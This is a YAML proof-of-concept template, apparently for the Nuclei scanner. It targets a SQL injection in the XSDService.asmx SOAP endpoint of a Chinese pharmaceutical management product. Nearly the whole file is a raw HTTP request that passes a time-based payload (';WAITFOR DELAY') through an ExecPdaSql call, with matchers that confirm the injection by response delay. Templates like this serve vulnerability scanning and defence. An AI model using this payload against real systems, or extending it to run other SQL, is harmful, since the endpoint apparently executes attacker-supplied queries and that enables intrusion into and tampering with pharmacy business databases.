config/pocs/huangyaoshi-xsdservice-sqli-2.yaml

id: huangyaoshi-xsdservice-sqli-2

info:
  name: 药业管理软件XSDService.asmx存在SQL注入漏洞
  author: qwtd
  severity: high
  reference:
    - https://github.com/wy876/POC/blob/main/%E9%BB%84%E8%8D%AF%E5%B8%88/%E8%8D%AF%E4%B8%9A%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6XSDService.asmx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: 黄药师-药业管理系统

http:
  - raw:
      - |
        POST /XSDService.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        Content-Length: length
        SOAPAction: "http://tempuri.org/ExecPdaSql"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <ExecPdaSql xmlns="http://tempuri.org/">
              <sql>;WAITFOR DELAY '0:0:5'--</sql>
            </ExecPdaSql>
          </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
      - type: word
        words:
          - "soap:Envelope"
